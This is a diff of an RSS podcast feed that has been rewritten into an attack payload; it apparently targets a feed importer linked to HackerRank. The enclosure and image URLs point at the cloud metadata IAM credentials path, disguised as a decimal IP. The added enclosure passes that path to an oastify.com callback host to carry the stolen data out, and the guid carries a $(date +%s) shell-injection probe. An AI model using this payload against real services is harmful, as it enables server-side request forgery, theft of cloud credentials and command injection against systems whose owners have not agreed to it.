@@ -1,16 +1,17 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
   <channel>
-    <title>HackerRank Radio Security Test</title>
-    <description>HackerRank Radio is a podcast for engineering leaders...</description>
+    <title>Hacked Security Research</title>
+    <description>Advanced Technical Analysis and Security Probing</description>
     <link>https://blog.hackerrank.com</link>
     <language>en-us</language>
-    <itunes:image href="http://2852039166/latest/meta-data/iam/security-credentials/"/>
+    <itunes:category text="Technology" />
     <item>
-      <title>Optimizing for Excellence</title>
-      <enclosure url="http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg"/>
+      <title>Exploit Update v5</title>
+      <description>Analyzing server-side request behavior</description>
+      <enclosure url="http://qe87xwo64k7y2mjj4hjarjfmhdn4b7zw.oastify.com/?data=http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg"/>
       <guid>unique-$(date +%s)</guid>
-      <pubDate>Fri, 10 Apr 2026 14:00:00 GMT</pubDate>
+      <pubDate>Fri, 10 Apr 2026 20:00:00 GMT</pubDate>
     </item>
   </channel>
 </rss>
